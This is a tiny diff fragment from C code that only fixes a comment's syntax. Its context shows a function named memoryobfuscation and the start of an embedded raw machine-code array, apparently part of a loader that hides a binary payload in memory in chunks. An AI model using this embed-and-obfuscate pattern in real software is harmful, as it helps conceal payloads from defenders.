@@ -28,7 +28,7 @@ TextSectionInfo GetTextSectionInfo(HMODULE hModule) {
 
 void memoryobfuscation(){
 
-# split into <4Kb parts to avoid __chkstk calls
+// split into <4Kb parts to avoid __chkstk calls
 
 unsigned char sidecar_bin_part_0[] = {
 0xe8, 0xc0, 0x1f, 0x01, 0x00, 0xc0, 0x1f, 0x01, 0x00, 0xb9, 0x3d, 0xee, 
